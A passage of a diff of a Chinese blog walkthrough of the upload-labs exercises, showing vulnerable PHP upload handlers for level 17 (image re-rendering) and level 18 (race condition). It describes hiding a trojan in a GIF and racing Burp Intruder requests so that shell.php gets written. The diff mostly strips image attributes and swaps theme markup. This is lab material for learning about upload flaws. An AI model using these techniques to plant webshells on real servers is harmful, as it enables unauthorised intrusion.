class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
@@ -482,13 +159,13 @@
 <p><code>imagecreatefromgif()</code>创建一块画布，从gif地址加载gif图片；</p>
 <p>然后经过二次渲染显示出来</p>
 <p>原理是上传一张图片，然后再把图片下载下来，对比前后图片的十六进制码，(头部除外)，对比前后hex码相同的位置，然后在其中插入木马，比如说这张gif(一般gif会比较容易插入)</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test.gif" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011352229.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test.gif"></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011352229.png"></p>
 <p>然后修改这部分</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011748800.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011748800.png"></p>
 <p>得到：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test-1691601488206-3.gif" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011956749.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test-1691601488206-3.gif"></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011956749.png"></p>
 <h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>本题考察条件竞争：<br>看一眼源代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -498,360 +175,60 @@
 
 <p>将上述代码重命名为jz.php</p>
 <p>bp抓包：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810022920827.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810022920827.png"></p>
 <p>丢到爆破区，然后clear掉所有的爆破点，主要是为了不断上传文件</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023105203.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023105203.png"></p>
 <p>payload设置为空，不受限发包：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023247221.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023247221.png"></p>
 <p>线程数调高点：</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810025018910.png" srcset="/img/loading.gif" lazyload></p>
-<p>然后就开始攻击，不断重发包<img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810121052870.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810025018910.png"></p>
+<p>然后就开始攻击，不断重发包<img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810121052870.png"></p>
 <p>同样的方法不断访问该文件</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142511762.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142511762.png"></p>
 <p>直到状态码出现200，就说明访问成功了，也就生成了shell.php</p>
-<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142757428.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3>
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" class="category-chain-item">常见漏洞</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/" class="category-chain-item">Web漏洞</a>
-  
-  
-
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Web/">#Web</a>
-      
-        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">#文件上传</a>
-      
-    </div>
-  
-</div>
-
-
-              
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件包含</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/02/09/SQLI/" title="SQLI">
-                        <span class="hidden-mobile">SQLI</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://potatowo233.github.io/" target="_blank" rel="nofollow noopener"><span>Potat0w0</span></a> <i class="iconfont icon-love"></i>
-
-    </div>
-  
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  
-<script src="/js/click.js"></script>
-<script src="/js/snow.js"></script>
-<script src="/js/potato.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
-</body>
-</html>
+<p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142757428.png"></p>
+<h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3></div><div class="article-licensing box"><div class="licensing-title"><p>文件上传</p><p><a href="http://example.com/2023/02/09/文件上传/">http://example.com/2023/02/09/文件上传/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Potat0w0</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-02-09</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-01-10</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Web/">Web</a><a class="link-muted mr-2" rel="tag" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">文件包含</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/02/09/SQLI/"><span class="level-item">SQLI</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/icon.jpg" alt="Potat0w0"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Potat0w0</p><p class="is-size-6 is-block">This is Potato&#039;s blog~</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Fuzhou,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">34</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">17</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Potatowo233" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/01/"><span class="level-start"><span class="level-item">一月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/10/"><span class="level-start"><span class="level-item">十月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">七月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/04/"><span class="level-start"><span class="level-item">四月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">三月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">二月 2023</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Docker/"><span class="tag">Docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Misc/"><span class="tag">Misc</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MySQL/"><span class="tag">MySQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tools/"><span class="tag">Tools</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sqli/"><span class="tag">sqli</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssti/"><span class="tag">ssti</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">文件包含</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"><span class="tag">正则表达式</span><span class="tag">1</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch 